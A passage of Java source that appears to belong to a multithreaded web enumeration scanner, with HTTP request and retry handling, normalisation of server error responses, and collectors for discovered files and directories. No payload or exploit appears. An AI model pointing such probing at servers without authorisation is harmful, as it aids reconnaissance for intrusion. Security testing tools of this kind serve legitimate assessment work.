				responseHeaderStatus = conn.getHeaderField(0);

				length = conn.getContentLength();

				content = conn.getContent();
			}catch(java.net.ConnectException e){
				if (debugMode) {
					System.err.println("Error: Connection error. Please check the protocol, the domain name, or the proxy server.");
				}
			} catch (Exception e) {
				if(responseHeaderStatus == null){
					//time-out
					throw new Exception("Time-Out was detected...");
				}else{
					//400 errors? we like 400 errors!
					if (debugMode) {
						//e.printStackTrace();
					}
				}
			}

			final java.io.InputStream stream = conn.getErrorStream();

			charset = "utf-8";
			// Get the content.

			if (stream != null) {
				content = readStream(length, stream, charset);
				stream.close();
			} else if (content != null && content instanceof java.io.InputStream) {
				content = readStream(length, (java.io.InputStream) content, charset);
			}

			//conn.disconnect();

			if (content == null) {
				finalResponse = "";
			} else {
				finalResponse = content.toString();
				finalResponse = finalResponse.toLowerCase();
				finalResponse = finalResponse.replaceAll("\\\\", "/");
				strAddition = strAddition.replaceAll("\\\\", "/");
				strAddition = strAddition.toLowerCase();
				String[] temp = strAddition.split("/");
				for (int i = 0; i < temp.length; i++) {
					if (temp[i].length() > 0) {
						while (finalResponse.indexOf(temp[i]) > 0) {
							finalResponse = finalResponse.replace(temp[i], "");
						}
					}
				}
				finalResponse = finalResponse.replaceAll("(?im)(([\\n\\r\\x00]+)|((server error in).+>)|((physical path).+>)|((requested url).+>)|((handler<).+>)|((notification<).+>)|(\\://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,3}(/\\S*)?)|(<!--[\\w\\W]*?-->)|((content-type)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((length)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((tag|p3p|expires|date|age|modified|cookie)[\\s\\:\\=]+[^\\r\\n]*)|([\\:\\-\\/\\ ]\\d{1,4})|(: [\\w\\d, :;=/]+\\W)|(^[\\w\\d, :;=/]+\\W$)|(\\d{1,4}[\\:\\-\\/\\ ]\\d{1,4}))", "");

				finalResponse = responseHeaderStatus.toString() + finalResponse;

			}
		} catch (BindException bindException) {
			try {
				if (conn != null) {
					conn.disconnect();
				}
				if (showProgress == 2 || debugMode) {
					System.out.println("HTTPReqResponse() - Increase your port binding range to get better result -> Wait for 1 seconds...");
				}
				Thread.sleep(1000);
			} catch (Exception err) {
				if (debugMode) {
					err.printStackTrace();
				}
			}
			finalResponse = HTTPReqResponse(strAddition, retryTimes);
		} catch (Exception err) {
			if (conn != null) {
				conn.disconnect();
			}
			retryTimes++;
			if (debugMode) {
				err.printStackTrace();
			}
			if (showProgress == 2 || debugMode) {
				System.out.println("HTTPReqResponse() - Retry: " + Integer.toString(retryTimes));
			}

			if (retryTimes < maxRetryTimes) {
				finalResponse = HTTPReqResponse(strAddition, retryTimes);
			}
		}
		
		return finalResponse;
	}

	private Object readStream(int length, java.io.InputStream stream, String charset)
			throws java.io.IOException {
		final int buflen = Math.max(1024, Math.max(length, stream.available()));
		byte[] buf = new byte[buflen];
		byte[] bytes = null;

		for (int nRead = stream.read(buf); nRead != -1; nRead = stream.read(buf)) {
			if (bytes == null) {
				bytes = buf;
				buf = new byte[buflen];
				continue;
			}
			final byte[] newBytes = new byte[bytes.length + nRead];
			System.arraycopy(bytes, 0, newBytes, 0, bytes.length);
			System.arraycopy(buf, 0, newBytes, bytes.length, nRead);
			bytes = newBytes;
		}

		if (charset == null) {
			return bytes;
		}
		try {
			return new String(bytes, charset);
		} catch (java.io.UnsupportedEncodingException e) {
		}
		return bytes;
	}

	private synchronized void addValidFileToResults(String strInput) {
		finalResultsFiles.add(strInput);
	}

	private synchronized void addValidDirToResults(String strInput) {
		finalResultsDirs.add(strInput);
	}

	private synchronized void incThreadCounter(int num) {
		threadCounter += num;
	}

	private synchronized void decThreadCounter(int num) {
		threadCounter -= num;
		if (threadCounter <= 0) {
			threadCounter = 0;
		}
	}

	private synchronized void incReqCounter(int num) {
		reqCounter += num;
	}

	private synchronized long getReqCounter() {
		return reqCounter;
	}

	private boolean isInteger(String input)
	{
		try
		{
			Integer.parseInt( input );
			return true;
		}
		catch(Exception e)
		{
			return false;
		}
	}

	private boolean isLong(String input)
	{
		try
		{
			Long.parseLong( input );
			return true;
		}
		catch(Exception e)
		{
			return false;
		}
	}
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// Copied from: http://www.edparrish.com/cis160/06s/examples/ThreadPool.java
	// Or: http://stackoverflow.com/questions/9700066/how-to-send-data-form-socket-to-serversocket-in-android
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	static class ThreadPool extends ThreadGroup {

		private boolean isAlive;
		private LinkedList taskQueue;
		private int threadID;
		private static int threadPoolID;

		/**
		 * Creates a new ThreadPool.
		 *
		 * @param numThreads
		 *            The number of threads in the pool.
		 */
		public ThreadPool(int numThreads) {
			super("ThreadPool-" + (threadPoolID++));
			setDaemon(true);

			isAlive = true;

			taskQueue = new LinkedList();
			for (int i = 0; i < numThreads; i++) {
				new PooledThread().start();
			}
		}

		/**
		 * Requests a new task to run. This method returns immediately, and the task
		 * executes on the next available idle thread in this ThreadPool.
		 * <p>
		 * Tasks start execution in the order they are received.
		 *
		 * @param task
		 *            The task to run. If null, no action is taken.
		 * @throws IllegalStateException
		 *             if this ThreadPool is already closed.
		 */
		public synchronized void runTask(Runnable task) {
			if (!isAlive) {
				throw new IllegalStateException();
			}
			if (task != null) {
				taskQueue.add(task);
				notify();
			}

		}

		protected synchronized Runnable getTask() throws InterruptedException {
			while (taskQueue.size() == 0) {
				if (!isAlive) {
					return null;
				}
				wait();
			}
			return (Runnable) taskQueue.removeFirst();
		}

		/**
		 * Closes this ThreadPool and returns immediately. All threads are stopped,
		 * and any waiting tasks are not executed. Once a ThreadPool is closed, no
		 * more tasks can be run on this ThreadPool.
		 */
		public synchronized void close() {
			if (isAlive) {
				isAlive = false;
				taskQueue.clear();
				interrupt();
			}
		}

		/**
		 * Closes this ThreadPool and waits for all running threads to finish. Any
		 * waiting tasks are executed.
		 */
		public void join() {
			// notify all waiting threads that this ThreadPool is no
			// longer alive
			synchronized (this) {
				isAlive = false;
				notifyAll();
			}

			// wait for all threads to finish
			Thread[] threads = new Thread[activeCount()];
			int count = enumerate(threads);
			for (int i = 0; i < count; i++) {
				try {
					threads[i].join();
				} catch (InterruptedException ex) {
				}
			}
		}

		/**
		 * A PooledThread is a Thread in a ThreadPool group, designed to run tasks
		 * (Runnables).
		 */
		private class PooledThread extends Thread {

			public PooledThread() {
				super(ThreadPool.this, "PooledThread-" + (threadID++));
			}

			public void run() {
				while (!isInterrupted()) {

					// get a task to run
					Runnable task = null;
					try {
						task = getTask();
					} catch (InterruptedException ex) {
					}

					// if getTask() returned null or was interrupted,
					// close this thread by returning.
					if (task == null) {
						return;
					}

					// run the task, and eat any exceptions it throws
					try {
						task.run();
					} catch (Throwable t) {
						uncaughtException(this, t);
					}
				}
			}
		}
	}
}
